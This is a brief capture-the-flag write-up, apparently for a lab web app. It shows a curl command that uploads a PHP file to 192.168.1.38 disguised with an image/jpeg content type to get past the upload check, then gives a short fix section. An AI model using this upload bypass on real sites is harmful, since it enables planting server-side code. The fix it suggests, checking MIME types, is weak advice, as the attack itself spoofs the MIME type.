# Upload Image
- We can test image validation by uploading other file types.
  
# Vulnerability
- For example this command will send a created php file as an image, also grep helps us find the flag.
__curl -s -X POST -F "uploaded=@evil.php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.38/index.php?page=upload" | grep 'flag'__
- And there's our flag.
  
# Fix
- Validating uploaded images is important.
- We can also prevent this by checking image mime types.